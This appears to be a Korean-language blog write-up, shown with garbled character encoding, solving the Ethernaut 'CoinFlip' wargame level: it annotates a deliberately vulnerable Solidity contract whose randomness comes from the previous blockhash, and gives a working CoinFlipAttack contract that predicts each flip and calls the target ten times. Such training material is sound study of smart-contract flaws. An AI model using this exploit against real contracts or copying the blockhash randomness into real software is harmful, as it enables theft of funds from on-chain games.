---
emoji: ๐งข
title: (Ethernaut ์ทจ์ฝ์  3) CoinFlip  
date: '2022-01-06 02:32:00'
author: ํ์ฑ์
tags: ethernaut CoinFlip vulnerability
categories: ์ทจ์ฝ์ ๋ถ์
---


# ๐ 1. CoinFlip
__Difficulty 3/10__

- ์น๋ฆฌ ์กฐ๊ฑด
- ์ฝ๋ ๋ถ์
- ํ์ด
์์๋ก ์งํ ๋  ๊ฒ์ด๋ค.

- - -

## ์น๋ฆฌ ์กฐ๊ฑด
- ๋์  ๋ค์ง๊ธฐ ๊ฒ์์์ 10๋ฒ ์ฐ์ ์์ธก ์ฑ๊ณตํ๊ธฐ

- - -

## ์ฝ๋ ๋ถ์
๋ถ์์ ์ฃผ์์!

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract CoinFlip {

  using SafeMath for uint256;
  // ์ฐ์ win์ ์
  uint256 public consecutiveWins;
  // ์ด์  flip()์ ์ฌ์ฉ๋๋ hash ๊ฐ 
  uint256 lastHash;
  // ๋์ ์์ฑ์ ์ํ ๊ฐ
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  
  //constructor: consecutiveWins ์ด๊ธฐ ๊ฐ์ 0์ผ๋ก setting
  constructor() public {
    consecutiveWins = 0;
  }

  //๋์  ๋ค์ง๊ธฐ ์์ธก์ ์ํ function
  //return boolean
  function flip(bool _guess) public returns (bool) {
    // blockValue์ last blockhash๋ฅผ uint256์ผ๋ก castingํด ์ ์ฅํ๋ค
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    //๋ง์ฝ ์ด์  ๊ฒ์์์ ์ฌ์ฉํ๋ hash๋ผ๋ฉด ๋ต์ด ๊ฐ์ ์ ์์์ผ๋ก revertํ๋ค
    if (lastHash == blockValue) {
      revert();
    }
    
    // ์ด๋ฒ ๊ฒ์์์ ์ฌ์ฉ ๋  hash๋ฅผ ์ ์ฅ
    lastHash = blockValue;
    //blockValue๋ฅผ FACTOR๋ก ๋๋ ๊ฐ์ coinFilip์ ์ ์ฅํ๋ค.
    uint256 coinFlip = blockValue.div(FACTOR);
    // coinFlip์ ์ซ์์ 1์ด ๊ฐ์ผ๋ฉด side์ true, ๋ค๋ฅด๋ฉด false๋ฅผ ์ ์ฅํ๋ค.
    bool side = coinFlip == 1 ? true : false;

    // ๋ง์ฝ side์ _guess๊ฐ ๊ฐ๋ค๋ฉด ์คํ, ์ฆ user์ ์์ธก์ด ๋ง์๋ค๋ฉด ์คํ
    if (side == _guess) {
      // ์ฐ์ win์ ์์ 1์ ๋ํ๋ค
      consecutiveWins++;
      return true;
    } 
    // ๋ง์ฝ side์ _guess๊ฐ ๋ค๋ฅด๋ค๋ฉด ์คํ, ์ฆ user์ ์์ธก์ด ํ๋ ธ๋ค๋ฉด ์คํ
    else {
      // ์ฐ์ win์ ์๋ฅผ ์ด๊ธฐํ ์ํจ๋ค.
      consecutiveWins = 0;
      return false;
    }
  }
}
```
- - -

### ํ์ด๋ฅผ ์ํ Setup
[RemixIDE](https://remix.ethereum.org)๋ฅผ ์ฌ์ฉํ๋ค. 
remix ์ฌ์ฉ๋ฒ์ YouTube์ google์ ๋ง์ด ๋์์์ผ๋ ์ต์ ๊ฒ์ผ๋ก ์ฐพ์๋ณด์!
๊ทธ๋ฆฌ๊ณ  docs๋ฅผ ์ฝ์ด๋ณธ๋ค๋ฉด ์ฌ์ฉ๋ฒ์ ์ฝ๊ฒ ์ตํ ์ ์์ ๊ฒ์ด๋ค.

ํ ๊ฐ์ง ์ฃผ์ํ  ์ ์ CoinFlip์ remix์์ ๋ฐ๋ก deployํ๋ ๊ฒ์ด ์๋๋ผ ethernauts์์ ๋ง๋  instance์ ์ฃผ์๋ฅผ ๊ฐ์ง๊ณ  addressAt์ ๋๋ฅด๋ฉด ๋๋ค.
๋ํ ์ฐ๋ฆฌ๋ Rinkeby Network๋ฅผ ์ฌ์ฉํ๊ณ  ์์ผ๋ ENVIRONMENT๋ฅผ "Injected Web3"๋ฅผ ์ ํํด์ฃผ์ด์ผ ํ๋ค.


## ํ์ด
์ด ๋ฌธ์ ๋ random์ผ๋ก ์์ฑ๋๋ ๊ฐ์ ์ฐ์ํด์ ๋ง์ถ๋ ๊ฒ์ด๋ค.
๊ทธ๋ฆฌ๊ณ  ์ด ๋ฌธ์ ์์ ์ฃผ๋ชฉํด์ผ ํ  ์ ์ randomness์ด๋ค.

solidity๋ฅผ ์ฌ์ฉํ์ฌ randomness๋ฅผ ์์ฑํ๋ ๊ฒ์ ๋งค์ฐ ๊น๋ค๋กญ๊ณ  ๋๋ถ๋ถ์ ๋ฐฉ๋ฒ์ hacking ๋นํ๊ธฐ ์ฝ๋ค. ๊ทธ๋์ randomness๋ฅผ ์์ฑํ๋ ๊ณณ์ ํ๊ณ ๋ค์ด์ผ ํ๋ค.

์ด CoinFlip contract์์๋ ๋ฏธ๋ฆฌ ์ ํด์ง FACTOR๊ณผ ์ด์  block์ hash๋ฅผ ์ฌ์ฉํ์ฌ randomness๋ฅผ ์์ฑํ๋ค.

blockhash์ ํน์ง์ ๋ฌด์์ผ๊น? ์ฐ์  blockhash๋ ํธ๋์ญ์์ด ์ถ๊ฐ๋ block์ hash ๊ฐ์ด๋ค. ์ฆ ๊ฐ์ block์ ์๋ transaction์ ๊ฐ์ blockhash๋ฅผ ๊ฐ์ง๋ค.

๊ทธ๋ ๋ค๋ฉด ์ฐ๋ฆฌ๊ฐ ๊ฐ์ block์ transaction์ ๋ณด๋ธ๋ค๋ฉด ํดํน์ด ๊ฐ๋ฅ ํ  ๊ฒ์ด๋ค!

๋๋ ๊ทธ๋์ CoinFlipAttack contract๋ฅผ ์๋ก ๋ง๋ค์๋ค. 

์ฃผ์์ ํตํด CoinFlipAttack contract๋ฅผ ๊ฐ์ด ๋ถ์ ํด๋ณด์!
```solidity
//์๋ง ์ํด์ ๋ณธ CoinFlip contract์ ๋งค์ฐ ๋น์ทํ  ๊ฒ์ด๋ค.
contract CoinFlipAttack {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 public lastHash;
  // CoinFlip.flip()์ ๊ฒฐ๊ณผ๋ฅผ ์์ธกํ๊ธฐ ์ํด ๊ฐ์ FACTOR๋ฅผ ์ด๋ค.
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  //CoinFlip contract์ address
  address coinFlipAddress;

  //contructor: ๋ฐฐํฌ์ CoinFlip์ address๋ฅผ ํฌํจํด ๋ฐฐํฌํ๋ค.
  constructor(address _coinFlipAddress) public {
    consecutiveWins = 0;
    //coinFlipAddress๋ฅผ CoinFlip์ address๋ก ์ค์ ํ๋ค.
    coinFlipAddress = _coinFlipAddress;
  }

  function flip() public {
    //CounFlip contract์ ๋๊ฐ์ด blockValue๋ฅผ ์์ฑํ๋ค.
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    //CounFlip contract์ ๋๊ฐ์ด conFlip ๊ฐ์ ์์ฑํ๋ค.
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;
    ์ด๋ฏธ ๋ง์ถ ๊ฐ์ CoinFlip.flip์ ๋ณด๋ด ํดํนํ๋ค.
    CoinFlip(coinFlipAddress).flip(side);

  }
}

```

์ฆ CoinFlipAttack.flip()์ ๋ค๋ฅธ ๋ธ๋ก์ 10๋ฒ callํ๋ฉด ํดํน์ ์ฑ๊ณตํ๊ฒ ๋๋ค.


์๋ฃ ํ Submit instance๋ฅผ ๋๋ฅด๊ณ  ์กฐ๊ธ ๊ธฐ๋ค๋ฆฌ๋ฉด block์ด mine๋๊ณ ,
```
ูฉ(- ฬฎฬฎฬ-ฬ)?ถ Well done, You have completed this level!!!
```

- - -
## ๋ง๋ฌด๋ฆฌ
solidity์์ randomness๋ฅผ ์์ฑํ๋ ๊ฒ์ ๊น๋ค๋กญ๋ค. block.timestamp, block.hash๋ฑ์ ์ฌ์ฉํ  ์ ์์ง๋ง ์ด๋ ๋ชจ๋ ์์ธก์ด ๊ฐ๋ฅํ๋ค. ๊ทธ๋์ contract์์ randomness๋ฅผ ์์ฑํ๋ ๊ฒ์ด ์๋๋ผ ์ธ๋ถ์ ๊ฐ์ ธ์ค๋ ๊ฒ์ด ์ข๋ค. Openzeppline์์๋ Chainlink VRF, RANDAO, Oraclize๋ฅผ ์ฌ์ฉํ๋ ๊ฒ์ ๊ถ์ฅํ๊ณ  ์๋ค. ์์ผ๋ก randomness๋ฅผ ๋ง๋ค๋ ์กฐ์ฌํ์! 

- - -
## ๊ธฐํ ์ ๋ณด
- rinkeyb network ether faucet: https://faucets.chain.link/rinkeby
- ethernaut: https://ethernaut.openzeppelin.com/
- remix IDE: https://remix.ethereum.org
```toc

```